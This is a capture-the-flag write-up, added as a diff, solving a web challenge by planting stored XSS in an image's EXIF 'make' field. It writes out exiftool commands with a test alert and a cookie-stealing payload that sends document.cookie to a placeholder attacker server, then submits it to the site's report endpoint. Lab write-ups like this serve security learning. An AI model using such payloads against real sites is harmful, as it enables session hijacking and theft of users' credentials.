@@ -1,0 +1,41 @@
+Challenge Description:
+Look at this nice new Social Media application. You can only view your own profile, 
+since it is still in the very early development phase, but it is the up and coming social networking platform.
+P.S. If you see something strange, let developers know!
+
+Challenge URL:
+https://imgr.pwn.institute/
+
+Steps to solve:
+You're presented with a simple social media application.
+You can register your account, change your profile picture and submit a url to developers.
+URL must point to https://imgr.pwn.institute/
+
+My first idea was to upload some kind of webshell as profile image but that approach failed.
+Filename gets hashed without extension.
+
+Once you're logged in in the app there is a html comment in the page source:
+<!-- todo: remove unused /imageinfo endpoint -->
+
+Imageinfo endpoint is showing exif data of an uploaded profile image.
+First idea was to test if for xss.
+
+
+I've created an image with xxs payload as "make".
+I've used exiftool:
+exiftool -make "<script>alert('xss')</script>" image.jpg
+
+Uploaded the image.jpg, opened it via https://imgr.pwn.institute/imageinfo/{image_hash} and
+bam javascript is executed.
+
+My next idea was to create cookie grabbing xss payload,
+save it as exif make and send it to developers via report endpoint.
+The idea was to steal admin's cookie:
+
+exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg
+
+I've uploaded imagefinal.jpg grabbed it's hashed value,
+went to https://imgr.pwn.institute/report and sent the evil URL to developers:
+https://imgr.pwn.institute/imageinfo/{imagefinal_hash}
+
+Instead of admin's cookie on my burpcollaborator I've received a connection that contains challenge flag.
